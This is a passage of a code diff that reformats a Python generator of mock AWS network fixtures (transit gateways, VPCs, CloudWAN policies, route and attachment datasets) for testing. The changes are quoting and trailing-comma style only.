-        region_names = ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-southeast-1', 'ap-northeast-1'][:regions]
+        region_names = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1", "ap-northeast-1"][:regions]
 
         for i, region in enumerate(region_names):
-            topology['regions'].append(region)
+            topology["regions"].append(region)
 
             # Create core network per region
             core_network = {
-                'CoreNetworkId': f'core-network-{region}',
-                'GlobalNetworkId': topology['global_network']['GlobalNetworkId'],
-                'State': 'AVAILABLE',
-                'Description': f'Core network for {region}',
-                'PolicyVersionId': '1',
-                'Region': region,
-                'Segments': ['production', 'staging', 'development']
+                "CoreNetworkId": f"core-network-{region}",
+                "GlobalNetworkId": topology["global_network"]["GlobalNetworkId"],
+                "State": "AVAILABLE",
+                "Description": f"Core network for {region}",
+                "PolicyVersionId": "1",
+                "Region": region,
+                "Segments": ["production", "staging", "development"],
             }
-            topology['core_networks'].append(core_network)
+            topology["core_networks"].append(core_network)
 
             # Create hub TGW for region
             hub_tgw = {
-                'TransitGatewayId': f'tgw-hub-{region}',
-                'State': 'available',
-                'Description': f'Hub transit gateway for {region}',
-                'AmazonSideAsn': 64512 + i,
-                'DefaultRouteTableId': f'tgw-rtb-hub-{region}',
-                'RouteTableIds': [f'tgw-rtb-hub-{region}', f'tgw-rtb-spoke-{region}']
+                "TransitGatewayId": f"tgw-hub-{region}",
+                "State": "available",
+                "Description": f"Hub transit gateway for {region}",
+                "AmazonSideAsn": 64512 + i,
+                "DefaultRouteTableId": f"tgw-rtb-hub-{region}",
+                "RouteTableIds": [f"tgw-rtb-hub-{region}", f"tgw-rtb-spoke-{region}"],
             }
-            topology['transit_gateways'][region] = [hub_tgw]
+            topology["transit_gateways"][region] = [hub_tgw]
 
             # Create spoke VPCs and TGWs
             region_vpcs = []
             for spoke_idx in range(spokes_per_region):
                 spoke_vpc = {
-                    'VpcId': f'vpc-spoke-{region}-{spoke_idx:03d}',
-                    'State': 'available',
-                    'CidrBlock': f'10.{i * 50 + spoke_idx}.0.0/16',
-                    'Region': region,
-                    'Tags': [
-                        {'Key': 'Name', 'Value': f'Spoke VPC {spoke_idx} - {region}'},
-                        {'Key': 'Environment', 'Value': ['production', 'staging', 'development'][spoke_idx % 3]},
-                        {'Key': 'Workload', 'Value': f'workload-{spoke_idx:03d}'},
-                        {'Key': 'CostCenter', 'Value': f'cc-{spoke_idx % 10:03d}'}
-                    ]
+                    "VpcId": f"vpc-spoke-{region}-{spoke_idx:03d}",
+                    "State": "available",
+                    "CidrBlock": f"10.{i * 50 + spoke_idx}.0.0/16",
+                    "Region": region,
+                    "Tags": [
+                        {"Key": "Name", "Value": f"Spoke VPC {spoke_idx} - {region}"},
+                        {"Key": "Environment", "Value": ["production", "staging", "development"][spoke_idx % 3]},
+                        {"Key": "Workload", "Value": f"workload-{spoke_idx:03d}"},
+                        {"Key": "CostCenter", "Value": f"cc-{spoke_idx % 10:03d}"},
+                    ],
                 }
                 region_vpcs.append(spoke_vpc)
 
-            topology['vpc_attachments'][region] = region_vpcs
+            topology["vpc_attachments"][region] = region_vpcs
 
             # Create cross-region peering connections
             if i > 0:
                 # Peer with previous region (creating a chain)
-                prev_region = region_names[i-1]
+                prev_region = region_names[i - 1]
                 peering = {
-                    'TransitGatewayPeeringAttachmentId': f'tgw-attach-peer-{prev_region}-{region}',
-                    'RequesterTgwInfo': {
-                        'TransitGatewayId': f'tgw-hub-{prev_region}',
-                        'Region': prev_region,
-                        'OwnerId': '123456789012'
+                    "TransitGatewayPeeringAttachmentId": f"tgw-attach-peer-{prev_region}-{region}",
+                    "RequesterTgwInfo": {
+                        "TransitGatewayId": f"tgw-hub-{prev_region}",
+                        "Region": prev_region,
+                        "OwnerId": "123456789012",
                     },
-                    'AccepterTgwInfo': {
-                        'TransitGatewayId': f'tgw-hub-{region}',
-                        'Region': region,
-                        'OwnerId': '123456789012'
+                    "AccepterTgwInfo": {
+                        "TransitGatewayId": f"tgw-hub-{region}",
+                        "Region": region,
+                        "OwnerId": "123456789012",
                     },
-                    'State': 'available',
-                    'Status': {'Code': 'available'}
+                    "State": "available",
+                    "Status": {"Code": "available"},
                 }
-                topology['peering_connections'].append(peering)
+                topology["peering_connections"].append(peering)
 
         return topology
 
@@ -114,83 +114,83 @@
     def generate_mesh_topology(regions: int = 4, vpcs_per_region: int = 8) -> Dict[str, Any]:
         """Generate full mesh network topology."""
         topology = {
-            'topology_type': 'full_mesh',
-            'regions': [],
-            'global_network': {
-                'GlobalNetworkId': 'global-network-full-mesh',
-                'Description': 'Full mesh network topology',
-                'State': 'AVAILABLE'
+            "topology_type": "full_mesh",
+            "regions": [],
+            "global_network": {
+                "GlobalNetworkId": "global-network-full-mesh",
+                "Description": "Full mesh network topology",
+                "State": "AVAILABLE",
             },
-            'core_networks': [],
-            'transit_gateways': {},
-            'vpc_attachments': {},
-            'peering_connections': []
+            "core_networks": [],
+            "transit_gateways": {},
+            "vpc_attachments": {},
+            "peering_connections": [],
         }
 
-        region_names = ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-southeast-1'][:regions]
+        region_names = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"][:regions]
 
         for i, region in enumerate(region_names):
-            topology['regions'].append(region)
+            topology["regions"].append(region)
 
             # Create core network
             core_network = {
-                'CoreNetworkId': f'core-network-mesh-{region}',
-                'GlobalNetworkId': topology['global_network']['GlobalNetworkId'],
-                'State': 'AVAILABLE',
-                'PolicyVersionId': '2',
-                'Region': region,
-                'Segments': ['shared', 'isolated', 'dmz']
+                "CoreNetworkId": f"core-network-mesh-{region}",
+                "GlobalNetworkId": topology["global_network"]["GlobalNetworkId"],
+                "State": "AVAILABLE",
+                "PolicyVersionId": "2",
+                "Region": region,
+                "Segments": ["shared", "isolated", "dmz"],
             }
-            topology['core_networks'].append(core_network)
+            topology["core_networks"].append(core_network)
 
             # Create TGW
             tgw = {
-                'TransitGatewayId': f'tgw-mesh-{region}',
-                'State': 'available',
-                'AmazonSideAsn': 65000 + i,
-                'DefaultRouteTableId': f'tgw-rtb-mesh-{region}',
-                'PropagationDefaultRouteTableId': f'tgw-rtb-prop-{region}',
-                'AssociationDefaultRouteTableId': f'tgw-rtb-assoc-{region}'
+                "TransitGatewayId": f"tgw-mesh-{region}",
+                "State": "available",
+                "AmazonSideAsn": 65000 + i,
+                "DefaultRouteTableId": f"tgw-rtb-mesh-{region}",
+                "PropagationDefaultRouteTableId": f"tgw-rtb-prop-{region}",
+                "AssociationDefaultRouteTableId": f"tgw-rtb-assoc-{region}",
             }
-            topology['transit_gateways'][region] = [tgw]
+            topology["transit_gateways"][region] = [tgw]
 
             # Create VPCs with different patterns
             region_vpcs = []
             for vpc_idx in range(vpcs_per_region):
                 vpc = {
-                    'VpcId': f'vpc-mesh-{region}-{vpc_idx:03d}',
-                    'State': 'available',
-                    'CidrBlock': f'172.{16 + i}.{vpc_idx}.0/24',
-                    'Region': region,
-                    'Tags': [
-                        {'Key': 'Name', 'Value': f'Mesh VPC {vpc_idx} - {region}'},
-                        {'Key': 'Segment', 'Value': ['shared', 'isolated', 'dmz'][vpc_idx % 3]},
-                        {'Key': 'Tier', 'Value': ['web', 'app', 'db'][vpc_idx % 3]}
-                    ]
+                    "VpcId": f"vpc-mesh-{region}-{vpc_idx:03d}",
+                    "State": "available",
+                    "CidrBlock": f"172.{16 + i}.{vpc_idx}.0/24",
+                    "Region": region,
+                    "Tags": [
+                        {"Key": "Name", "Value": f"Mesh VPC {vpc_idx} - {region}"},
+                        {"Key": "Segment", "Value": ["shared", "isolated", "dmz"][vpc_idx % 3]},
+                        {"Key": "Tier", "Value": ["web", "app", "db"][vpc_idx % 3]},
+                    ],
                 }
                 region_vpcs.append(vpc)
-            topology['vpc_attachments'][region] = region_vpcs
+            topology["vpc_attachments"][region] = region_vpcs
 
         # Create full mesh peering connections
         for i, region1 in enumerate(region_names):
             for j, region2 in enumerate(region_names):
                 if i < j:  # Avoid duplicate connections
                     peering = {
-                        'TransitGatewayPeeringAttachmentId': f'tgw-attach-mesh-{region1}-{region2}',
-                        'RequesterTgwInfo': {
-                            'TransitGatewayId': f'tgw-mesh-{region1}',
-                            'Region': region1,
-                            'OwnerId': '123456789012'
+                        "TransitGatewayPeeringAttachmentId": f"tgw-attach-mesh-{region1}-{region2}",
+                        "RequesterTgwInfo": {
+                            "TransitGatewayId": f"tgw-mesh-{region1}",
+                            "Region": region1,
+                            "OwnerId": "123456789012",
                         },
-                        'AccepterTgwInfo': {
-                            'TransitGatewayId': f'tgw-mesh-{region2}',
-                            'Region': region2,
-                            'OwnerId': '123456789012'
+                        "AccepterTgwInfo": {
+                            "TransitGatewayId": f"tgw-mesh-{region2}",
+                            "Region": region2,
+                            "OwnerId": "123456789012",
                         },
-                        'State': 'available',
-                        'Status': {'Code': 'available'}
+                        "State": "available",
+                        "Status": {"Code": "available"},
                     }
-                    topology['peering_connections'].append(peering)
+                    topology["peering_connections"].append(peering)
 
         return topology
 
@@ -198,70 +198,70 @@
     def generate_hierarchical_topology(levels: int = 3, branches_per_level: int = 4) -> Dict[str, Any]:
         """Generate hierarchical network topology."""
         topology = {
-            'topology_type': 'hierarchical',
-            'levels': levels,
-            'branches_per_level': branches_per_level,
-            'global_network': {
-                'GlobalNetworkId': 'global-network-hierarchical',
-                'Description': 'Hierarchical network topology',
-                'State': 'AVAILABLE'
+            "topology_type": "hierarchical",
+            "levels": levels,
+            "branches_per_level": branches_per_level,
+            "global_network": {
+                "GlobalNetworkId": "global-network-hierarchical",
+                "Description": "Hierarchical network topology",
+                "State": "AVAILABLE",
             },
-            'hierarchy': {},
-            'core_networks': [],
-            'routing_policies': []
+            "hierarchy": {},
+            "core_networks": [],
+            "routing_policies": [],
         }
 
         def create_hierarchical_node(level: int, parent_id: str = None, branch_idx: int = 0):
             if level > levels:
                 return None
 
-            node_id = f'level-{level}-branch-{branch_idx:03d}'
+            node_id = f"level-{level}-branch-{branch_idx:03d}"
             if parent_id:
-                node_id = f'{parent_id}-{node_id}'
+                node_id = f"{parent_id}-{node_id}"
 
             node = {
-                'node_id': node_id,
-                'level': level,
-                'parent_id': parent_id,
-                'core_network_id': f'core-network-{node_id}',
-                'children': [],
-                'vpcs': []
+                "node_id": node_id,
+                "level": level,
+                "parent_id": parent_id,
+                "core_network_id": f"core-network-{node_id}",
+                "children": [],
+                "vpcs": [],
             }
 
             # Create core network for this node
             core_network = {
-                'CoreNetworkId': node['core_network_id'],
-                'GlobalNetworkId': topology['global_network']['GlobalNetworkId'],
-                'State': 'AVAILABLE',
-                'Level': level,
-                'ParentCoreNetworkId': f'core-network-{parent_id}' if parent_id else None,
-                'PolicyVersionId': str(level)
+                "CoreNetworkId": node["core_network_id"],
+                "GlobalNetworkId": topology["global_network"]["GlobalNetworkId"],
+                "State": "AVAILABLE",
+                "Level": level,
+                "ParentCoreNetworkId": f"core-network-{parent_id}" if parent_id else None,
+                "PolicyVersionId": str(level),
             }
-            topology['core_networks'].append(core_network)
+            topology["core_networks"].append(core_network)
 
             # Create VPCs for this level
             vpcs_at_level = max(1, 2 ** (levels - level))  # More VPCs at lower levels
             for vpc_idx in range(vpcs_at_level):
                 vpc = {
-                    'VpcId': f'vpc-{node_id}-{vpc_idx:03d}',
-                    'State': 'available',
-                    'CidrBlock': f'10.{level}.{branch_idx * 10 + vpc_idx}.0/24',
-                    'Level': level,
-                    'NodeId': node_id
+                    "VpcId": f"vpc-{node_id}-{vpc_idx:03d}",
+                    "State": "available",
+                    "CidrBlock": f"10.{level}.{branch_idx * 10 + vpc_idx}.0/24",
+                    "Level": level,
+                    "NodeId": node_id,
                 }
-                node['vpcs'].append(vpc)
+                node["vpcs"].append(vpc)
 
             # Create child nodes
             if level < levels:
                 for child_idx in range(branches_per_level):
                     child = create_hierarchical_node(level + 1, node_id, child_idx)
                     if child:
-                        node['children'].append(child)
+                        node["children"].append(child)
 
             return node
 
         # Build hierarchy starting from root
-        topology['hierarchy'] = create_hierarchical_node(1)
+        topology["hierarchy"] = create_hierarchical_node(1)
 
         return topology
 
@@ -273,112 +273,110 @@
     def generate_enterprise_policy(segments: int = 10, rules: int = 50) -> Dict[str, Any]:
         """Generate enterprise-grade CloudWAN policy."""
         policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': [f'{64512 + i * 100}-{64512 + (i + 1) * 100 - 1}' for i in range(5)],
-                'edge-locations': [],
-                'inside-cidr-blocks': ['169.254.0.0/16'],
-                'vpn-ecmp-support': True
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": [f"{64512 + i * 100}-{64512 + (i + 1) * 100 - 1}" for i in range(5)],
+                "edge-locations": [],
+                "inside-cidr-blocks": ["169.254.0.0/16"],
+                "vpn-ecmp-support": True,
             },
-            'segments': [],
-            'segment-actions': [],
-            'attachment-policies': []
+            "segments": [],
+            "segment-actions": [],
+            "attachment-policies": [],
         }
 
         # Generate edge locations for major AWS regions
         aws_regions = [
-            'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
-            'eu-west-1', 'eu-west-2', 'eu-central-1',
-            'ap-southeast-1', 'ap-southeast-2', 'ap-northeast-1'
+            "us-east-1",
+            "us-east-2",
+            "us-west-1",
+            "us-west-2",
+            "eu-west-1",
+            "eu-west-2",
+            "eu-central-1",
+            "ap-southeast-1",
+            "ap-southeast-2",
+            "ap-northeast-1",
         ]
 
         for i, region in enumerate(aws_regions):
-            edge_location = {
-                'location': region,
-                'asn': 64512 + i * 10,
-                'inside-cidr-blocks': [f'169.254.{i}.0/24']
-            }
-            policy['core-network-configuration']['edge-locations'].append(edge_location)
+            edge_location = {"location": region, "asn": 64512 + i * 10, "inside-cidr-blocks": [f"169.254.{i}.0/24"]}
+            policy["core-network-configuration"]["edge-locations"].append(edge_location)
 
         # Generate segments with enterprise patterns
         segment_types = [
-            {'name': 'production', 'isolation': False, 'acceptance': False},
-            {'name': 'staging', 'isolation': True, 'acceptance': True},
-            {'name': 'development', 'isolation': True, 'acceptance': True},
-            {'name': 'shared-services', 'isolation': False, 'acceptance': False},
-            {'name': 'dmz', 'isolation': True, 'acceptance': True},
-            {'name': 'management', 'isolation': True, 'acceptance': True}
+            {"name": "production", "isolation": False, "acceptance": False},
+            {"name": "staging", "isolation": True, "acceptance": True},
+            {"name": "development", "isolation": True, "acceptance": True},
+            {"name": "shared-services", "isolation": False, "acceptance": False},
+            {"name": "dmz", "isolation": True, "acceptance": True},
+            {"name": "management", "isolation": True, "acceptance": True},
         ]
 
         for i in range(segments):
             base_segment = segment_types[i % len(segment_types)]
             segment = {
-                'name': f'{base_segment["name"]}-{i // len(segment_types) + 1:02d}',
-                'description': f'Enterprise segment for {base_segment["name"]} workloads instance {i + 1}',
-                'require-attachment-acceptance': base_segment['acceptance'],
-                'isolate-attachments': base_segment['isolation'],
-                'allow-filter': [f'10.{i}.0.0/16', f'172.{16 + i}.0.0/12'],
-                'deny-filter': ['192.168.0.0/16'] if base_segment['isolation'] else [],
-                'edge-locations': aws_regions[:(i % 5) + 1]  # Varying edge location coverage
+                "name": f"{base_segment['name']}-{i // len(segment_types) + 1:02d}",
+                "description": f"Enterprise segment for {base_segment['name']} workloads instance {i + 1}",
+                "require-attachment-acceptance": base_segment["acceptance"],
+                "isolate-attachments": base_segment["isolation"],
+                "allow-filter": [f"10.{i}.0.0/16", f"172.{16 + i}.0.0/12"],
+                "deny-filter": ["192.168.0.0/16"] if base_segment["isolation"] else [],
+                "edge-locations": aws_regions[: (i % 5) + 1],  # Varying edge location coverage
             }
-            policy['segments'].append(segment)
+            policy["segments"].append(segment)
 
         # Generate segment actions (sharing rules)
         for i in range(segments):
-            segment_name = policy['segments'][i]['name']
+            segment_name = policy["segments"][i]["name"]
 
             # Create sharing rules based on segment type
-            if 'production' in segment_name:
+            if "production" in segment_name:
                 # Production segments share with shared-services
-                shared_segments = [s['name'] for s in policy['segments'] if 'shared-services' in s['name']]
-            elif 'shared-services' in segment_name:
+                shared_segments = [s["name"] for s in policy["segments"] if "shared-services" in s["name"]]
+            elif "shared-services" in segment_name:
                 # Shared services can be accessed by all
-                shared_segments = [s['name'] for s in policy['segments'] if s['name'] != segment_name][:5]
+                shared_segments = [s["name"] for s in policy["segments"] if s["name"] != segment_name][:5]
             else:
                 # Other segments share within their type
-                shared_segments = [s['name'] for s in policy['segments']
-                                 if s['name'] != segment_name and s['name'].split('-')[0] == segment_name.split('-')[0]][:3]
+                shared_segments = [
+                    s["name"]
+                    for s in policy["segments"]
+                    if s["name"] != segment_name and s["name"].split("-")[0] == segment_name.split("-")[0]
+                ][:3]
 
             if shared_segments:
                 segment_action = {
-                    'action': 'share',
-                    'segment': segment_name,
-                    'share-with': shared_segments,
-                    'mode': 'attachment-route'
+                    "action": "share",
+                    "segment": segment_name,
+                    "share-with": shared_segments,
+                    "mode": "attachment-route",
                 }
-                policy['segment-actions'].append(segment_action)
+                policy["segment-actions"].append(segment_action)
 
         # Generate attachment policies
         for i in range(rules):
             rule = {
-                'rule-number': i + 1,
-                'description': f'Enterprise attachment rule {i + 1}',
-                'condition-logic': 'and' if i % 2 == 0 else 'or',
-                'conditions': [
+                "rule-number": i + 1,
+                "description": f"Enterprise attachment rule {i + 1}",
+                "condition-logic": "and" if i % 2 == 0 else "or",
+                "conditions": [
                     {
-                        'type': 'tag-value',
-                        'key': 'Environment',
-                        'value': ['production', 'staging', 'development'][i % 3],
-                        'operator': 'equals'
+                        "type": "tag-value",
+                        "key": "Environment",
+                        "value": ["production", "staging", "development"][i % 3],
+                        "operator": "equals",
                     },
-                    {
-                        'type': 'account-id',
-                        'value': f'{123456789000 + (i % 50)}',
-                        'operator': 'equals'
-                    },
-                    {
-                        'type': 'tag-exists',
-                        'key': 'CostCenter',
-                        'operator': 'exists'
-                    }
+                    {"type": "account-id", "value": f"{123456789000 + (i % 50)}", "operator": "equals"},
+                    {"type": "tag-exists", "key": "CostCenter", "operator": "exists"},
                 ],
-                'action': {
-                    'association-method': 'constant',
-                    'segment': policy['segments'][i % len(policy['segments'])]['name'],
-                    'require-acceptance': i % 4 == 0  # 25% require acceptance
-                }
+                "action": {
+                    "association-method": "constant",
+                    "segment": policy["segments"][i % len(policy["segments"])]["name"],
+                    "require-acceptance": i % 4 == 0,  # 25% require acceptance
+                },
             }
-            policy['attachment-policies'].append(rule)
+            policy["attachment-policies"].append(rule)
 
         return policy
 
@@ -386,90 +384,87 @@
     def generate_security_focused_policy() -> Dict[str, Any]:
         """Generate security-focused CloudWAN policy with strict isolation."""
         policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555', '65000-65010'],
-                'edge-locations': [
-                    {'location': 'us-east-1', 'asn': 64512},
-                    {'location': 'us-west-2', 'asn': 64513}
-                ],
-                'inside-cidr-blocks': ['169.254.0.0/16']
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555", "65000-65010"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}, {"location": "us-west-2", "asn": 64513}],
+                "inside-cidr-blocks": ["169.254.0.0/16"],
             },
-            'segments': [
+            "segments": [
                 {
-                    'name': 'pci-compliant',
-                    'description': 'PCI DSS compliant segment with strict isolation',
-                    'require-attachment-acceptance': True,
-                    'isolate-attachments': True,
-                    'allow-filter': ['10.1.0.0/16'],
-                    'deny-filter': ['0.0.0.0/0'],  # Deny all by default
-                    'edge-locations': ['us-east-1']
+                    "name": "pci-compliant",
+                    "description": "PCI DSS compliant segment with strict isolation",
+                    "require-attachment-acceptance": True,
+                    "isolate-attachments": True,
+                    "allow-filter": ["10.1.0.0/16"],
+                    "deny-filter": ["0.0.0.0/0"],  # Deny all by default
+                    "edge-locations": ["us-east-1"],
                 },
                 {
-                    'name': 'hipaa-compliant',
-                    'description': 'HIPAA compliant segment for healthcare data',
-                    'require-attachment-acceptance': True,
-                    'isolate-attachments': True,
-                    'allow-filter': ['10.2.0.0/16'],
-                    'deny-filter': ['192.168.0.0/16', '172.16.0.0/12'],
-                    'edge-locations': ['us-east-1']
+                    "name": "hipaa-compliant",
+                    "description": "HIPAA compliant segment for healthcare data",
+                    "require-attachment-acceptance": True,
+                    "isolate-attachments": True,
+                    "allow-filter": ["10.2.0.0/16"],
+                    "deny-filter": ["192.168.0.0/16", "172.16.0.0/12"],
+                    "edge-locations": ["us-east-1"],
                 },
                 {
-                    'name': 'sox-compliant',
-                    'description': 'SOX compliant segment for financial data',
-                    'require-attachment-acceptance': True,
-                    'isolate-attachments': True,
-                    'allow-filter': ['10.3.0.0/16'],
-                    'deny-filter': ['0.0.0.0/0'],
-                    'edge-locations': ['us-east-1', 'us-west-2']
+                    "name": "sox-compliant",
+                    "description": "SOX compliant segment for financial data",
+                    "require-attachment-acceptance": True,
+                    "isolate-attachments": True,
+                    "allow-filter": ["10.3.0.0/16"],
+                    "deny-filter": ["0.0.0.0/0"],
+                    "edge-locations": ["us-east-1", "us-west-2"],
                 },
                 {
-                    'name': 'security-tools',
-                    'description': 'Security tools and monitoring segment',
-                    'require-attachment-acceptance': True,
-                    'isolate-attachments': False,
-                    'allow-filter': ['10.10.0.0/16'],
-                    'edge-locations': ['us-east-1', 'us-west-2']
-                }
+                    "name": "security-tools",
+                    "description": "Security tools and monitoring segment",
+                    "require-attachment-acceptance": True,
+                    "isolate-attachments": False,
+                    "allow-filter": ["10.10.0.0/16"],
+                    "edge-locations": ["us-east-1", "us-west-2"],
+                },
             ],
-            'segment-actions': [
+            "segment-actions": [
                 {
-                    'action': 'share',
-                    'segment': 'security-tools',
-                    'share-with': ['pci-compliant', 'hipaa-compliant', 'sox-compliant'],
-                    'mode': 'single-route'
+                    "action": "share",
+                    "segment": "security-tools",
+                    "share-with": ["pci-compliant", "hipaa-compliant", "sox-compliant"],
+                    "mode": "single-route",
                 }
             ],
-            'attachment-policies': [
+            "attachment-policies": [
                 {
-                    'rule-number': 1,
-                    'description': 'PCI compliant resources',
-                    'condition-logic': 'and',
-                    'conditions': [
-                        {'type': 'tag-value', 'key': 'Compliance', 'value': 'PCI', 'operator': 'equals'},
-                        {'type': 'tag-value', 'key': 'DataClassification', 'value': 'Restricted', 'operator': 'equals'}
+                    "rule-number": 1,
+                    "description": "PCI compliant resources",
+                    "condition-logic": "and",
+                    "conditions": [
+                        {"type": "tag-value", "key": "Compliance", "value": "PCI", "operator": "equals"},
+                        {"type": "tag-value", "key": "DataClassification", "value": "Restricted", "operator": "equals"},
                     ],
-                    'action': {
-                        'association-method': 'constant',
-                        'segment': 'pci-compliant',
-                        'require-acceptance': True
-                    }
+                    "action": {
+                        "association-method": "constant",
+                        "segment": "pci-compliant",
+                        "require-acceptance": True,
+                    },
                 },
                 {
-                    'rule-number': 2,
-                    'description': 'HIPAA compliant resources',
-                    'condition-logic': 'and',
-                    'conditions': [
-                        {'type': 'tag-value', 'key': 'Compliance', 'value': 'HIPAA', 'operator': 'equals'},
-                        {'type': 'tag-value', 'key': 'DataType', 'value': 'PHI', 'operator': 'equals'}
+                    "rule-number": 2,
+                    "description": "HIPAA compliant resources",
+                    "condition-logic": "and",
+                    "conditions": [
+                        {"type": "tag-value", "key": "Compliance", "value": "HIPAA", "operator": "equals"},
+                        {"type": "tag-value", "key": "DataType", "value": "PHI", "operator": "equals"},
                     ],
-                    'action': {
-                        'association-method': 'constant',
-                        'segment': 'hipaa-compliant',
-                        'require-acceptance': True
-                    }
-                }
-            ]
+                    "action": {
+                        "association-method": "constant",
+                        "segment": "hipaa-compliant",
+                        "require-acceptance": True,
+                    },
+                },
+            ],
         }
 
         return policy
@@ -483,22 +478,26 @@
         """Generate large route dataset for performance testing."""
         routes = []
 
-        route_types = ['static', 'propagated', 'local']
-        route_states = ['active', 'blackhole']
+        route_types = ["static", "propagated", "local"]
+        route_states = ["active", "blackhole"]
 
         for i in range(route_count):
             route = {
-                'DestinationCidrBlock': f'{10 + (i // 65536)}.{(i // 256) % 256}.{i % 256}.0/32',
-                'TransitGatewayAttachments': [
+                "DestinationCidrBlock": f"{10 + (i // 65536)}.{(i // 256) % 256}.{i % 256}.0/32",
+                "TransitGatewayAttachments": [
                     {
-                        'TransitGatewayAttachmentId': f'tgw-attach-{i // 1000:06d}',
-                        'ResourceId': f'vpc-{i // 1000:06d}',
-                        'ResourceType': 'vpc'
+                        "TransitGatewayAttachmentId": f"tgw-attach-{i // 1000:06d}",
+                        "ResourceId": f"vpc-{i // 1000:06d}",
+                        "ResourceType": "vpc",
                     }
-                ] if i % 10 != 9 else [],  # 10% blackhole routes
-                'Type': route_types[i % len(route_types)],
-                'State': route_states[0 if i % 10 != 9 else 1],
-                'RouteOrigin': 'CreateRoute' if route_types[i % len(route_types)] == 'static' else 'EnableVgwRoutePropagation'
+                ]
+                if i % 10 != 9
+                else [],  # 10% blackhole routes
+                "Type": route_types[i % len(route_types)],
+                "State": route_states[0 if i % 10 != 9 else 1],
+                "RouteOrigin": "CreateRoute"
+                if route_types[i % len(route_types)] == "static"
+                else "EnableVgwRoutePropagation",
             }
             routes.append(route)
 
@@ -511,25 +510,25 @@
 
         for i in range(vpc_count):
             vpc = {
-                'VpcId': f'vpc-{i:08d}abcdef{i%16:x}',
-                'State': 'available',
-                'CidrBlock': f'10.{i//256}.{i%256}.0/24',
-                'DhcpOptionsId': f'dopt-{i:08d}',
-                'InstanceTenancy': 'default',
-                'IsDefault': False,
-                'Tags': [
-                    {'Key': 'Name', 'Value': f'VPC-{i:05d}'},
-                    {'Key': 'Environment', 'Value': 'production' if i % 2 == 0 else 'development'},
-                    {'Key': 'Region', 'Value': f'us-east-{(i % 4) + 1}'},
-                    {'Key': 'CostCenter', 'Value': f'CC-{i % 100:03d}'}
+                "VpcId": f"vpc-{i:08d}abcdef{i % 16:x}",
+                "State": "available",
+                "CidrBlock": f"10.{i // 256}.{i % 256}.0/24",
+                "DhcpOptionsId": f"dopt-{i:08d}",
+                "InstanceTenancy": "default",
+                "IsDefault": False,
+                "Tags": [
+                    {"Key": "Name", "Value": f"VPC-{i:05d}"},
+                    {"Key": "Environment", "Value": "production" if i % 2 == 0 else "development"},
+                    {"Key": "Region", "Value": f"us-east-{(i % 4) + 1}"},
+                    {"Key": "CostCenter", "Value": f"CC-{i % 100:03d}"},
                 ],
-                'CidrBlockAssociationSet': [
+                "CidrBlockAssociationSet": [
                     {
-                        'AssociationId': f'vpc-cidr-assoc-{i:08d}',
-                        'CidrBlock': f'10.{i//256}.{i%256}.0/24',
-                        'CidrBlockState': {'State': 'associated'}
+                        "AssociationId": f"vpc-cidr-assoc-{i:08d}",
+                        "CidrBlock": f"10.{i // 256}.{i % 256}.0/24",
+                        "CidrBlockState": {"State": "associated"},
                     }
-                ]
+                ],
             }
             vpcs.append(vpc)
 
@@ -542,27 +541,27 @@
 
         for i in range(attachment_count):
             attachment = {
-                'TransitGatewayAttachmentId': f'tgw-attach-{i:08d}',
-                'RequesterTgwInfo': {
-                    'TransitGatewayId': f'tgw-requester-{i//1000:05d}',
-                    'OwnerId': f'{123456789012 + (i//10000)}',
-                    'Region': f'us-{["east", "west"][i%2]}-{(i%4)+1}'
+                "TransitGatewayAttachmentId": f"tgw-attach-{i:08d}",
+                "RequesterTgwInfo": {
+                    "TransitGatewayId": f"tgw-requester-{i // 1000:05d}",
+                    "OwnerId": f"{123456789012 + (i // 10000)}",
+                    "Region": f"us-{['east', 'west'][i % 2]}-{(i % 4) + 1}",
                 },
-                'AccepterTgwInfo': {
-                    'TransitGatewayId': f'tgw-accepter-{i//1000:05d}',
-                    'OwnerId': f'{210987654321 + (i//10000)}',
-                    'Region': f'eu-{["west", "central"][i%2]}-{(i%3)+1}'
+                "AccepterTgwInfo": {
+                    "TransitGatewayId": f"tgw-accepter-{i // 1000:05d}",
+                    "OwnerId": f"{210987654321 + (i // 10000)}",
+                    "Region": f"eu-{['west', 'central'][i % 2]}-{(i % 3) + 1}",
                 },
-                'Status': {
-                    'Code': 'available' if i % 20 != 19 else 'pending-acceptance',
-                    'Message': 'Peering attachment is available'
+                "Status": {
+                    "Code": "available" if i % 20 != 19 else "pending-acceptance",
+                    "Message": "Peering attachment is available",
                 },
-                'State': 'available' if i % 20 != 19 else 'pending-acceptance',
-                'CreatedAt': datetime(2024, 1, 15 + (i//10000), 10, 30, 45, tzinfo=timezone.utc),
-                'Tags': [
-                    {'Key': 'Batch', 'Value': f'batch-{i//1000:03d}'},
-                    {'Key': 'Environment', 'Value': 'production' if i % 3 == 0 else 'staging'}
-                ]
+                "State": "available" if i % 20 != 19 else "pending-acceptance",
+                "CreatedAt": datetime(2024, 1, 15 + (i // 10000), 10, 30, 45, tzinfo=timezone.utc),
+                "Tags": [
+                    {"Key": "Batch", "Value": f"batch-{i // 1000:03d}"},
+                    {"Key": "Environment", "Value": "production" if i % 3 == 0 else "staging"},
+                ],
             }
             attachments.append(attachment)
 
@@ -576,81 +575,83 @@
     def generate_global_deployment_config() -> Dict[str, Any]:
         """Generate global multi-region deployment configuration."""
         config = {
-            'deployment_type': 'global',
-            'primary_region': 'us-east-1',
-            'secondary_regions': ['us-west-2', 'eu-west-1', 'ap-southeast-1'],
-            'disaster_recovery_region': 'us-west-2',
-            'regions': {}
+            "deployment_type": "global",
+            "primary_region": "us-east-1",
+            "secondary_regions": ["us-west-2", "eu-west-1", "ap-southeast-1"],
+            "disaster_recovery_region": "us-west-2",
+            "regions": {},
         }
 
-        all_regions = [config['primary_region']] + config['secondary_regions']
+        all_regions = [config["primary_region"]] + config["secondary_regions"]
 
         for i, region in enumerate(all_regions):
             region_config = {
-                'region_name': region,
-                'is_primary': region == config['primary_region'],
-                'availability_zones': [f'{region}a', f'{region}b', f'{region}c'],
-                'core_networks': [
+                "region_name": region,
